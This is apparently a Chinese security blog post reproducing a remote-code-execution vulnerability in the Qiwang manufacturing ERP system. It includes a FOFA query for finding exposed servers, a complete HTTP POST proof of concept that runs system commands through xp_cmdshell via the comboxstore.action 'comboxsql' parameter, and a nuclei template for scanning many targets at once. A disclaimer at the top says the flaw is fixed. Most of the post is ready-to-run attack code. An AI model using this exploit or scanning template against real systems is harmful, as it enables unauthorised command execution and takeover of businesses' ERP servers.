# 原创
：  漏洞复现--企望制造ERP系统 RCE

# 漏洞复现--企望制造ERP系统 RCE

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负**

### 一：漏洞描述

企望制造ERP系统是畅捷通公司开发的一款领先的生产管理系统，它以集成化管理为核心设计理念，通过模块化机制，帮助企业实现生产、采购、库存等方面的高效管理。该产品comboxstore.action接口存在RCE风险。

### 二：漏洞影响版本

企望制造ERP

### 三：网络空间测绘查询

fofa：<br/> `title="企望制造ERP系统"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/dcb267f69463704f2708a4338df798a3.jpeg"/>

### 四：漏洞复现

POC：

```
POST /mainFunctions/comboxstore.action HTTP/1.1
Host: IP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=ADF9CC6DC882489E063DFAC2420182FF
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

comboxsql=exec%20xp_cmdshell%20'whoami'

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/bba5b34571e7509b0a4805f89e8762d7.jpeg"/><br/> 访问/mainFunctions/comboxstore.action<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a9c7dfe4b1143f1fbd78ffc2b81a0dbc.jpeg"/><br/> 存在如上页面即可能存在漏洞<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/914181c178e4ef1637a6cf17fbbc8ca7.jpeg"/>

### 五：批量验证

nuclei：

```
id: qiwang-erp-comboxstore-rce

info:
  name: qiwang-erp-comboxstore-rce
  author: yy
  severity: critical
  description: SQL注入，可调用xp_cmdshell执行命令
  tags: qiwang,erp,,sqli,rce
  metadata:
    fofa-qeury: title="企望制造ERP系统"
    veified: true
    max-request: 1

http:
  - raw:
      - |
        POST /mainFunctions/comboxstore.action HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded
        Connection: close
        Upgrade-Insecure-Requests: 1
        Content-Length: 43

        comboxsql=exec%20xp_cmdshell%20'echo hello qiwang erp'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - 'hello'
          - 'qiwang erp'
        condition: and
        part: body

```

脚本来自揽月安全团队<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/d53601d5ed00077a7ee47b85ae6055db.jpeg"/>
